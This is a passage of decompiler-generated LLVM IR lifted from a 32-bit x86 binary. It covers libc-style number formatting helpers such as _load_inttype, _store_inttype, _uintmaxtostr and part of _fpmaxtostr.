  store i32 %v0_8051de0, i32* @ebx, align 4
  ret i32 %v0_8051e78

; uselistorder directives
  uselistorder i32 %v0_8051e78, { 1, 0 }
  uselistorder i32 %v0_8051e6a, { 1, 0, 2 }
  uselistorder i32 %tmp17, { 1, 0 }
  uselistorder i32 %v1_8051e35, { 1, 0, 2 }
  uselistorder i32 %v0_8051e47, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8051dee, { 1, 0 }
  uselistorder i32 %v2_8051dec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8051de0, { 1, 0 }
  uselistorder i32 1024, { 0, 17, 3, 10, 8, 18, 4, 1, 2, 15, 5, 14, 6, 16, 9, 11, 12, 13, 7 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051e78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e64, { 1, 0 }
  uselistorder label %dec_label_pc_8051e02, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8051e88 = icmp slt i32 %tmp, 0
  %v3_8051eb1 = and i32 %tmp5, 2048
  %v4_8051eb1 = icmp eq i32 %v3_8051eb1, 0
  br i1 %v5_8051e88, label %dec_label_pc_8051eb1, label %dec_label_pc_8051e8f

dec_label_pc_8051e8f:                             ; preds = %entry
  %v1_8051e92 = icmp eq i1 %v4_8051eb1, false
  br i1 %v1_8051e92, label %dec_label_pc_8051eb6, label %dec_label_pc_8051e94

dec_label_pc_8051e94:                             ; preds = %dec_label_pc_8051e8f
  %v1_8051e94 = inttoptr i32 %tmp4 to i32*
  %v2_8051e94 = load i32, i32* %v1_8051e94, align 4
  %v6_8051e96 = icmp eq i32 %tmp5, 256
  %v1_8051e9c = icmp eq i1 %v6_8051e96, false
  br i1 %v1_8051e9c, label %dec_label_pc_8051ea3, label %dec_label_pc_8051e9e

dec_label_pc_8051e9e:                             ; preds = %dec_label_pc_8051e94
  %v1_8051e9e = urem i32 %v2_8051e94, 256
  br label %dec_label_pc_8051eae

dec_label_pc_8051ea3:                             ; preds = %dec_label_pc_8051e94
  %v6_8051ea3 = icmp eq i32 %tmp5, 512
  %v1_8051ea9 = icmp eq i1 %v6_8051ea3, false
  br i1 %v1_8051ea9, label %dec_label_pc_8051eae, label %dec_label_pc_8051eab

dec_label_pc_8051eab:                             ; preds = %dec_label_pc_8051ea3
  %v1_8051eab = urem i32 %v2_8051e94, 65536
  br label %dec_label_pc_8051eae

dec_label_pc_8051eae:                             ; preds = %dec_label_pc_8051ea3, %dec_label_pc_8051e9e, %dec_label_pc_8051eab
  %v0_8051eb0 = phi i32 [ %v2_8051e94, %dec_label_pc_8051ea3 ], [ %v1_8051e9e, %dec_label_pc_8051e9e ], [ %v1_8051eab, %dec_label_pc_8051eab ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8051eb0

dec_label_pc_8051eb1:                             ; preds = %entry
  br i1 %v4_8051eb1, label %dec_label_pc_8051ebc, label %dec_label_pc_8051eb6

dec_label_pc_8051eb6:                             ; preds = %dec_label_pc_8051eb1, %dec_label_pc_8051e8f
  %v1_8051eb6 = add i32 %tmp4, 4
  %v2_8051eb6 = inttoptr i32 %v1_8051eb6 to i32*
  %v3_8051eb6 = load i32, i32* %v2_8051eb6, align 4
  store i32 %v3_8051eb6, i32* @edx, align 4
  %v1_8051eb9 = inttoptr i32 %tmp4 to i32*
  %v2_8051eb9 = load i32, i32* %v1_8051eb9, align 4
  ret i32 %v2_8051eb9

dec_label_pc_8051ebc:                             ; preds = %dec_label_pc_8051eb1
  %v1_8051ebc = inttoptr i32 %tmp4 to i32*
  %v2_8051ebc = load i32, i32* %v1_8051ebc, align 4
  %v6_8051ebe = icmp eq i32 %tmp5, 256
  %v1_8051ec4 = icmp eq i1 %v6_8051ebe, false
  br i1 %v1_8051ec4, label %dec_label_pc_8051ecb, label %dec_label_pc_8051ec6

dec_label_pc_8051ec6:                             ; preds = %dec_label_pc_8051ebc
  %v1_8051ec6 = mul i32 %v2_8051ebc, 16777216
  %v2_8051ec6 = sdiv i32 %v1_8051ec6, 16777216
  br label %dec_label_pc_8051ed4

dec_label_pc_8051ecb:                             ; preds = %dec_label_pc_8051ebc
  %v6_8051ecb = icmp eq i32 %tmp5, 512
  %v1_8051ed1 = icmp eq i1 %v6_8051ecb, false
  br i1 %v1_8051ed1, label %dec_label_pc_8051ed4, label %dec_label_pc_8051ed3

dec_label_pc_8051ed3:                             ; preds = %dec_label_pc_8051ecb
  %v1_8051ed3 = mul i32 %v2_8051ebc, 65536
  %v2_8051ed3 = sdiv i32 %v1_8051ed3, 65536
  br label %dec_label_pc_8051ed4

dec_label_pc_8051ed4:                             ; preds = %dec_label_pc_8051ecb, %dec_label_pc_8051ec6, %dec_label_pc_8051ed3
  %v0_8051ed4 = phi i32 [ %v2_8051ebc, %dec_label_pc_8051ecb ], [ %v2_8051ec6, %dec_label_pc_8051ec6 ], [ %v2_8051ed3, %dec_label_pc_8051ed3 ]
  %v1_8051ed4 = ashr i32 %v0_8051ed4, 31
  store i32 %v1_8051ed4, i32* @edx, align 4
  ret i32 %v0_8051ed4

; uselistorder directives
  uselistorder i32 %v0_8051ed4, { 1, 0 }
  uselistorder i32 %v2_8051ebc, { 2, 0, 1 }
  uselistorder i32 %v2_8051e94, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051ed4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051eae, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ed8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ed8, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8051edd = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8051edd, i32* %ebx.global-to-local, align 4
  %v4_8051ee1 = trunc i32 %tmp4 to i16
  %v6_8051ee9 = icmp eq i32 %tmp6, 256
  %v1_8051eef = icmp eq i1 %v6_8051ee9, false
  br i1 %v1_8051eef, label %dec_label_pc_8051ef5, label %dec_label_pc_8051ef1

dec_label_pc_8051ef1:                             ; preds = %entry
  %v2_8051ef1 = trunc i32 %tmp4 to i8
  %v4_8051ef1 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8051ef1, i8* %v4_8051ef1, align 1
  br label %dec_label_pc_8051f13

dec_label_pc_8051ef5:                             ; preds = %entry
  %v6_8051ef5 = icmp eq i32 %tmp6, 2048
  %v1_8051efb = icmp eq i1 %v6_8051ef5, false
  br i1 %v1_8051efb, label %dec_label_pc_8051f04, label %dec_label_pc_8051efd

dec_label_pc_8051efd:                             ; preds = %dec_label_pc_8051ef5
  %sext2 = mul i32 %tmp4, 65536
  %v1_8051efd = sdiv i32 %sext2, 65536
  %v3_8051efd = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051efd, i32* %v3_8051efd, align 4
  %v0_8051eff = load i32, i32* %edx.global-to-local, align 4
  %v1_8051eff = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051eff = add i32 %v1_8051eff, 4
  %v3_8051eff = inttoptr i32 %v2_8051eff to i32*
  store i32 %v0_8051eff, i32* %v3_8051eff, align 4
  br label %dec_label_pc_8051f13

dec_label_pc_8051f04:                             ; preds = %dec_label_pc_8051ef5
  %v6_8051f04 = icmp eq i32 %tmp6, 512
  %v1_8051f0a = icmp eq i1 %v6_8051f04, false
  br i1 %v1_8051f0a, label %dec_label_pc_8051f11, label %dec_label_pc_8051f0c

dec_label_pc_8051f0c:                             ; preds = %dec_label_pc_8051f04
  store i16 %v4_8051ee1, i16* %tmp5, align 2
  br label %dec_label_pc_8051f13

dec_label_pc_8051f11:                             ; preds = %dec_label_pc_8051f04
  %sext3 = mul i32 %tmp4, 65536
  %v1_8051f11 = sdiv i32 %sext3, 65536
  %v3_8051f11 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051f11, i32* %v3_8051f11, align 4
  br label %dec_label_pc_8051f13

dec_label_pc_8051f13:                             ; preds = %dec_label_pc_8051f0c, %dec_label_pc_8051efd, %dec_label_pc_8051ef1, %dec_label_pc_8051f11
  %v2_8051f13 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f13, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8051f14 = sdiv i32 %sext, 65536
  ret i32 %v1_8051f14

; uselistorder directives
  uselistorder label %dec_label_pc_8051f13, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8051f23 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051f23, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8051f2f = icmp slt i32 %arg4, 0
  %v1_8051f31 = icmp eq i1 %v2_8051f2f, false
  br i1 %v1_8051f31, label %dec_label_pc_8051f52, label %dec_label_pc_8051f33

dec_label_pc_8051f33:                             ; preds = %entry
  %v1_8051f33 = sub i32 0, %arg4
  store i32 %v1_8051f33, i32* %esi.global-to-local, align 4
  %v2_8051f35 = icmp slt i32 %arg3, 0
  %v1_8051f37 = icmp eq i1 %v2_8051f35, false
  br i1 %v1_8051f37, label %dec_label_pc_8051f52, label %dec_label_pc_8051f39

dec_label_pc_8051f39:                             ; preds = %dec_label_pc_8051f33
  %v1_8051f39 = sub i32 0, %arg2
  %v5_8051f39 = icmp ne i32 %arg2, 0
  store i32 %v1_8051f39, i32* %ecx.global-to-local, align 4
  %v2_8051f3b = zext i1 %v5_8051f39 to i32
  %v3_8051f3b = add i32 %v2_8051f3b, %arg3
  %v1_8051f46 = sub i32 0, %v3_8051f3b
  store i32 %v1_8051f46, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f52

dec_label_pc_8051f52:                             ; preds = %entry, %dec_label_pc_8051f33, %dec_label_pc_8051f39
  %v0_8051f57 = phi i32 [ %v1_8051f33, %dec_label_pc_8051f39 ], [ %v1_8051f33, %dec_label_pc_8051f33 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8051f39 ], [ 0, %dec_label_pc_8051f33 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8051f57
  %tmp35 = urem i32 -1, %v0_8051f57
  %v1_8051f59 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8051f5d = load i32, i32* %esi.global-to-local, align 4
  %v12_8051f5d = icmp eq i32 %v1_8051f59, %v1_8051f5d
  %v1_8051f67 = icmp eq i1 %v12_8051f5d, false
  br i1 %v1_8051f67, label %dec_label_pc_8051f76, label %dec_label_pc_8051f69

dec_label_pc_8051f69:                             ; preds = %dec_label_pc_8051f52
  %v1_8051f69 = add i32 %div, 1
  br label %dec_label_pc_8051f76

dec_label_pc_8051f76:                             ; preds = %dec_label_pc_8051f52, %dec_label_pc_8051f69
  %stack_var_-20.0.off0 = phi i32 [ %v1_8051f59, %dec_label_pc_8051f52 ], [ 0, %dec_label_pc_8051f69 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8051f52 ], [ %v1_8051f69, %dec_label_pc_8051f69 ]
  %v0_8051f76 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051f76, i32* %ebp.global-to-local, align 4
  %v0_8051f78 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051f78, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051f7e

dec_label_pc_8051f7e:                             ; preds = %dec_label_pc_8051fbd, %dec_label_pc_8051f76
  %v0_8051fb5 = phi i32 [ %v0_8051fce, %dec_label_pc_8051fbd ], [ %v0_8051f76, %dec_label_pc_8051f76 ]
  %v0_8051f82 = phi i32 [ %v1_8051fd0, %dec_label_pc_8051fbd ], [ %v0_8051f78, %dec_label_pc_8051f76 ]
  %v1_8051f7e = icmp eq i32 %v0_8051f82, 0
  br i1 %v1_8051f7e, label %dec_label_pc_8051fb5, label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f7e
  %v0_8051f86 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8051f82, %v0_8051f86
  %tmp36 = urem i32 %v0_8051f82, %v0_8051f86
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8051fb5, %v0_8051f86
  %tmp37 = urem i32 %v0_8051fb5, %v0_8051f86
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8051f99 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8051f9d = add i32 %tmp37, %v6_8051f99
  %v8_8051fa3 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8051fa8 = add i32 %div8, %v8_8051fa3
  store i32 %v2_8051fa8, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8051f9d, %v0_8051f86
  %tmp38 = urem i32 %v2_8051f9d, %v0_8051f86
  %v2_8051fb0 = add i32 %div9, %v2_8051fa8
  br label %dec_label_pc_8051fbd

dec_label_pc_8051fb5:                             ; preds = %dec_label_pc_8051f7e
  %v0_8051fb9 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8051fb5, %v0_8051fb9
  %tmp39 = urem i32 %v0_8051fb5, %v0_8051fb9
  br label %dec_label_pc_8051fbd

dec_label_pc_8051fbd:                             ; preds = %dec_label_pc_8051f82, %dec_label_pc_8051fb5
  %v0_8051fc3 = phi i32 [ %tmp38, %dec_label_pc_8051f82 ], [ %tmp39, %dec_label_pc_8051fb5 ]
  %storemerge = phi i32 [ %v2_8051fb0, %dec_label_pc_8051f82 ], [ %div12, %dec_label_pc_8051fb5 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8051fbd = load i32, i32* %edi.global-to-local, align 4
  %v1_8051fbd = add i32 %v0_8051fbd, -1
  store i32 %v1_8051fbd, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8051fc3, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8051fc3
  %v8_8051fc3 = trunc i32 %storemerge14.in to i8
  %v3_8051fcc = inttoptr i32 %v1_8051fbd to i8*
  store i8 %v8_8051fc3, i8* %v3_8051fcc, align 1
  %v0_8051fce = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051fd0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fd0 = or i32 %v1_8051fd0, %v0_8051fce
  %v3_8051fd0 = icmp eq i32 %v2_8051fd0, 0
  %v1_8051fd2 = icmp eq i1 %v3_8051fd0, false
  br i1 %v1_8051fd2, label %dec_label_pc_8051f7e, label %dec_label_pc_8051fd4

dec_label_pc_8051fd4:                             ; preds = %dec_label_pc_8051fbd
  %v4_8051fd4 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8051fd4, label %dec_label_pc_8051fdf, label %dec_label_pc_8051fdb

dec_label_pc_8051fdb:                             ; preds = %dec_label_pc_8051fd4
  %v0_8051fdb = load i32, i32* %edi.global-to-local, align 4
  %v1_8051fdb = add i32 %v0_8051fdb, -1
  store i32 %v1_8051fdb, i32* %edi.global-to-local, align 4
  %v1_8051fdc = inttoptr i32 %v1_8051fdb to i8*
  store i8 45, i8* %v1_8051fdc, align 1
  br label %dec_label_pc_8051fdf

dec_label_pc_8051fdf:                             ; preds = %dec_label_pc_8051fd4, %dec_label_pc_8051fdb
  %v0_8051fe2 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051fe2

; uselistorder directives
  uselistorder i32 %v2_8051f9d, { 1, 0 }
  uselistorder i32 %v0_8051f86, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8051f82, { 1, 0, 2 }
  uselistorder i32 %v0_8051fb5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051f57, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051fdf, { 1, 0 }
  uselistorder label %dec_label_pc_8051fbd, { 1, 0 }
  uselistorder label %dec_label_pc_8051f76, { 1, 0 }
  uselistorder label %dec_label_pc_8051f52, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051fed = load i32, i32* @edi, align 4
  %v0_8051fee = load i32, i32* @esi, align 4
  %v0_8051fef = load i32, i32* @ebx, align 4
  store i32 %v0_8051fef, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_8052004 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8052004 = add i3 %v4_8052004, -1
  store i3 %v5_8052004, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_805200b = add i32 %tmp112, 4
  %v2_805200b = inttoptr i32 %v1_805200b to i32*
  %v3_805200b = load i32, i32* %v2_805200b, align 4
  store i32 %v3_805200b, i32* %eax.global-to-local, align 4
  %v1_8052012 = add i32 %tmp112, 8
  %v2_8052012 = inttoptr i32 %v1_8052012 to i8*
  %v3_8052012 = load i8, i8* %v2_8052012, align 1
  %v4_8052012 = zext i8 %v3_8052012 to i32
  %v5_8052012 = load i32, i32* @ecx, align 4
  %v6_8052012 = and i32 %v5_8052012, -256
  %v7_8052012 = or i32 %v6_8052012, %v4_8052012
  store i32 %v7_8052012, i32* %ecx.global-to-local, align 4
  %v1_8052015 = inttoptr i32 %tmp112 to i32*
  %v2_8052015 = load i32, i32* %v1_8052015, align 4
  store i32 %v2_8052015, i32* %ebp.global-to-local, align 4
  %v3_8052017 = and i32 %v3_805200b, -256
  %v4_8052017 = or i32 %v3_8052017, %v4_8052012
  %v1_805201d = or i32 %v4_8052017, 32
  %v3_805201d = trunc i32 %v1_805201d to i8
  store i32 %v1_805201d, i32* %eax.global-to-local, align 4
  %v10_8052028 = icmp eq i8 %v3_805201d, 97
  %v1_805202a = icmp eq i1 %v10_8052028, false
  br i1 %v1_805202a, label %dec_label_pc_8052033, label %dec_label_pc_805202c

dec_label_pc_805202c:                             ; preds = %entry
  %v1_805202c = add i32 %v7_8052012, 6
  %v11_805202c = trunc i32 %v1_805202c to i8
  store i32 %v1_805202c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052033

dec_label_pc_8052033:                             ; preds = %entry, %dec_label_pc_805202c
  %stack_var_-206.0 = phi i8 [ %v3_8052012, %entry ], [ %v11_805202c, %dec_label_pc_805202c ]
  %v2_8052033 = icmp slt i32 %v2_8052015, 0
  %v1_8052035 = icmp eq i1 %v2_8052033, false
  br i1 %v1_8052035, label %dec_label_pc_805203c, label %dec_label_pc_8052037

dec_label_pc_8052037:                             ; preds = %dec_label_pc_8052033
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805203c

dec_label_pc_805203c:                             ; preds = %dec_label_pc_8052033, %dec_label_pc_8052037
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805204b = add i32 %tmp112, 12
  %v2_805204b = inttoptr i32 %v1_805204b to i32*
  %v3_805204b = load i32, i32* %v2_805204b, align 4
  store i32 %v3_805204b, i32* %eax.global-to-local, align 4
  %v2_805204e = and i32 %v3_805204b, 2
  %v3_805204e = icmp eq i32 %v2_805204e, 0
  br i1 %v3_805204e, label %dec_label_pc_805205c, label %dec_label_pc_8052068

dec_label_pc_805205c:                             ; preds = %dec_label_pc_805203c
  %v2_805205c = urem i32 %v3_805204b, 2
  %tmp143 = trunc i32 %v2_805205c to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8052068

dec_label_pc_8052068:                             ; preds = %dec_label_pc_805205c, %dec_label_pc_805203c
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_805203c ], [ %tmp144, %dec_label_pc_805205c ]
  %v1_805207c = udiv i32 %v3_805204b, 256
  %tmp146 = and i32 %v1_805207c, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_80521ce, label %dec_label_pc_80520ee

dec_label_pc_80520ee:                             ; preds = %dec_label_pc_8052068
  store i3 %v4_8052004, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80520f5 = add i32 %tmp112, 16
  %v2_80520f5 = inttoptr i32 %v1_80520f5 to i32*
  store i32 32, i32* %v2_80520f5, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_805210c = add i8 %stack_var_-206.0, -96
  %v6_805210c = sub i8 95, %stack_var_-206.0
  %v7_805210c = and i8 %v6_805210c, %stack_var_-206.0
  %v8_805210c = icmp slt i8 %v7_805210c, 0
  %v9_805210c = icmp eq i8 %v4_805210c, 0
  %v10_805210c = icmp slt i8 %v4_805210c, 0
  %v3_8052111 = icmp eq i1 %v10_805210c, %v8_805210c
  %v4_8052111 = icmp eq i1 %v9_805210c, false
  %v5_8052111 = and i1 %v4_8052111, %v3_8052111
  br i1 %v5_8052111, label %dec_label_pc_8052118, label %dec_label_pc_8052113

dec_label_pc_8052113:                             ; preds = %dec_label_pc_80520ee
  br label %dec_label_pc_8052118

dec_label_pc_8052118:                             ; preds = %dec_label_pc_80520ee, %dec_label_pc_8052113
  %v2_8052120 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052120, i32* @ecx, align 4
  br label %dec_label_pc_80524f3

dec_label_pc_80521ce:                             ; preds = %dec_label_pc_8052068
  %v1_805208d = add i3 %v4_8052004, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_80521d2 = and i32 %v3_805204b, -65536
  %v2_80521d7 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_80521d7, i32* %edx.global-to-local, align 4
  %v1_80521de = udiv i16 %tmp103, 256
  %v2_80521de = zext i16 %v1_80521de to i32
  %v3_80521de = mul nuw nsw i32 %v2_80521de, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_80521d2.masked = zext i16 %tmp148 to i32
  %v11_80521de = or i32 %v4_80521d2.masked, %v3_80521de
  %v10_80521de = or i32 %v11_80521de, %v6_80521d2
  %v12_80521de = or i32 %v10_80521de, 3072
  store i32 %v12_80521de, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_805208d, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80521f2

dec_label_pc_80521f2:                             ; preds = %dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge, %dec_label_pc_80521ce
  %v2_805220f = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_80521ce ], [ %v2_805220f.pre, %dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge ]
  %v1_80521f2 = phi i3 [ %v1_805208d, %dec_label_pc_80521ce ], [ %v1_80521f2.pre, %dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge ]
  %v3_8052219 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_80521ce ], [ %v0_80521f2.pre, %dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_80521d7, %dec_label_pc_80521ce ], [ %v4_8052214, %dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_8052219 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_805220c = sitofp i32 %tmp149 to x86_fp80
  %v4_805220f = fsub x86_fp80 %v2_805220f, %v5_805220c
  store i3 %v1_80521f2, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8052214 = add i32 %stack_var_-212.0, 9
  %v4_8052219 = fmul x86_fp80 %v3_8052219, %v4_805220f
  store x86_fp80 %v4_8052219, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805221b

dec_label_pc_805221b:                             ; preds = %dec_label_pc_805221b.dec_label_pc_805221b_crit_edge, %dec_label_pc_80521f2
  %v0_805222d = phi i32 [ %v0_805222d.pre, %dec_label_pc_805221b.dec_label_pc_805221b_crit_edge ], [ %tmp149, %dec_label_pc_80521f2 ]
  %v0_805221b = phi i32 [ %v0_805221b.pre, %dec_label_pc_805221b.dec_label_pc_805221b_crit_edge ], [ 0, %dec_label_pc_80521f2 ]
  %v1_805221b = add i32 %v0_805221b, 1
  store i32 %v1_805221b, i32* %esi.global-to-local, align 4
  %v2_8052220 = sub i32 %v4_8052214, %v1_805221b
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_805222d, 10
  %tmp136 = urem i32 %v0_805222d, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052220, i32* %eax.global-to-local, align 4
  %v1_8052239 = or i32 %tmp136, 48
  %v8_8052239 = trunc i32 %v1_8052239 to i8
  store i32 %v1_8052239, i32* %edx.global-to-local, align 4
  %v3_805223f = inttoptr i32 %v2_8052220 to i8*
  store i8 %v8_8052239, i8* %v3_805223f, align 1
  %v7_8052241 = icmp sgt i32 %v1_805221b, 8
  br i1 %v7_8052241, label %dec_label_pc_8052243, label %dec_label_pc_805221b.dec_label_pc_805221b_crit_edge

dec_label_pc_805221b.dec_label_pc_805221b_crit_edge: ; preds = %dec_label_pc_805221b
  %v0_805221b.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_805222d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805221b

dec_label_pc_8052243:                             ; preds = %dec_label_pc_805221b
  %v0_8052243 = load i32, i32* @edi, align 4
  %v1_8052243 = add i32 %v0_8052243, 1
  store i32 %v1_8052243, i32* @edi, align 4
  %v7_8052247 = icmp sgt i32 %v1_8052243, 2
  br i1 %v7_8052247, label %dec_label_pc_8052249, label %dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge

dec_label_pc_8052243.dec_label_pc_80521f2_crit_edge: ; preds = %dec_label_pc_8052243
  %v0_80521f2.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_80521f2.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_805220f.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80521f2

dec_label_pc_8052249:                             ; preds = %dec_label_pc_8052243
  %v0_8052249 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8052249 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8052249, x86_fp80* %st0.global-to-local, align 4
  %v2_805224b = add i3 %v0_8052249, 2
  store i3 %v2_805224b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805224d = add i8 %stack_var_-206.0, -96
  %v6_805224d = sub i8 95, %stack_var_-206.0
  %v7_805224d = and i8 %v6_805224d, %stack_var_-206.0
  %v8_805224d = icmp slt i8 %v7_805224d, 0
  %v9_805224d = icmp eq i8 %v4_805224d, 0
  %v10_805224d = icmp slt i8 %v4_805224d, 0
  %v3_8052252 = icmp eq i1 %v10_805224d, %v8_805224d
  %v4_8052252 = icmp eq i1 %v9_805224d, false
